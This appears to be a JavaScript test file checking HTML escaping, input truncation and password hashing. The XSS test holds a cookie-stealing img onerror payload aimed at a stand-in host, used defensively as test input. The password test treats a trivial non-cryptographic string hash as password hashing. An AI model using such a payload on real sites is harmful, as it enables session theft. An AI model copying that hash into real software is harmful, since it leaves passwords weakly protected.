import test from 'node:test';
import assert from 'node:assert/strict';

function escHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

test('Security: HTML entity escaping protects against XSS injection', () => {
  const dangerousScript = '<script>alert("hacked")</script>';
  const escapedScript = escHtml(dangerousScript);
  assert.equal(escapedScript.includes('<script>'), false);
  assert.equal(escapedScript, '&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;');

  const imgPayload = '<img src=x onerror="fetch(`//malicious.site?token=${document.cookie}`)">';
  const escapedImg = escHtml(imgPayload);
  assert.equal(escapedImg.includes('<img'), false);
  assert.equal(escapedImg.includes('onerror='), true);
  assert.equal(escapedImg.startsWith('&lt;img'), true);
});

test('Security: Payload truncation protects backend against oversized documents', () => {
  const largeText = 'A'.repeat(60000);
  const truncatedText = largeText.slice(0, 50000);
  assert.equal(truncatedText.length, 50000);
  assert.ok(largeText.length > 50000);
});

test('Security: Password hashing does not store raw passwords in fallback store', () => {
  function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  }

  const rawPassword = 'MySecretPassword123!';
  const hash = simpleHash(rawPassword);
  assert.notEqual(hash, rawPassword);
  assert.equal(typeof hash, 'string');
  assert.ok(hash.length > 0);
});
